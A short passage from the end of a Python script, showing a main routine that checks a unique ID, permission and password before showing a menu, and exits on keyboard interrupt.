        print_stylish_line()
        unique_key = get_unique_id()
        check_permission(unique_key)
        if check_password():
            show_menu()
    except KeyboardInterrupt:
        print(RED + "\n[!] User Interrupted")
        sys.exit()

if __name__ == '__main__':
    main()